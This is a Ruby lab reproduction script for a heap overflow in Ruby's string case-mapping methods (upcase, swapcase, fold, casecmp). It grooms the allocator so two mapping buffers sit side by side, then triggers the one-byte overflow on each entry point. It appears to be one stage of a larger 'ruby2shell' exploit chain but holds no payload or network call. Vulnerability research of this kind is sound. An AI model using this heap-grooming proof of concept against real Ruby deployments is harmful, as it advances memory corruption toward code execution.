#!/usr/bin/env ruby
# Veria-named entry points for CVE-2026-132825 (upcase, swapcase,
# downcase(:fold), String#casecmp?, Symbol#casecmp?) on the pinned Stage A
# canary geometry. Each arm is one local process; mtrace reports the size
# LSB of the adjacent mapping-buffer chunk, which is the overflow byte.
#
# Usage:
#   ENC=ISO-8859-1 OP=upcase MTRACE_FD=2 LD_PRELOAD=/abs/lab/preload/mtrace.so \
#     lab/build/plain/ruby-3.4.12-plain/bin/ruby \
#     lab/repro/ruby2shell-entrypoints.rb
#
# OP: upcase | swapcase | fold | casecmp | symcasecmp
# No network, no external systems.
$stdout.sync = true

def marker(s)
  STDERR.write(s)
  STDERR.flush
end

enc_name = ENV.fetch('ENC', 'ISO-8859-1')
op = ENV.fetch('OP', 'upcase')
n = Integer(ENV.fetch('N', '780'))
raise "bad N #{n}" unless n >= 2
OPS = %w[upcase swapcase fold casecmp symcasecmp].freeze
raise "unsupported OP #{op.inspect}" unless OPS.include?(op)

enc = Encoding.find(enc_name)
map = case op
      when 'upcase'    then ->(s) { s.upcase }
      when 'swapcase'  then ->(s) { s.swapcase }
      when 'fold'      then ->(s) { s.downcase(:fold) }
      when 'casecmp'   then ->(s) { s.casecmp?(s) }
      when 'symcasecmp' then ->(s) { s.to_sym.casecmp?(s.to_sym) }
      end

marker("===SETTLE enc=#{enc_name} op=#{op} n=#{n}===\n")
GC.start

# Same drain as ruby2shell-crossenc-stageA.rb: carve the 0x340 / 0x330
# classes from the top chunk so the primer's two mapping buffers land
# adjacently.
drain340 = Array.new(512) { 'd' * 823 }
drain330 = Array.new(512) { 'e' * 800 }

marker("===PRIMER===\n")
primer = ("\xDF".b * n).force_encoding(enc)
t1 = map.call(primer)
raise "primer geometry broken: #{t1.inspect}" if
  %w[upcase swapcase fold].include?(op) && t1.bytesize != 2 * n

marker("===REAL===\n")
s = ("a".b + "\xDF".b * (n - 1)).force_encoding(enc)
t2 = map.call(s)
out = %w[upcase swapcase fold].include?(op) ? "bytes=#{t2.bytesize}" : "result=#{t2.inspect}"
puts "entrypoint enc=#{enc_name} op=#{op} #{out} NO_ABORT"
GC.disable
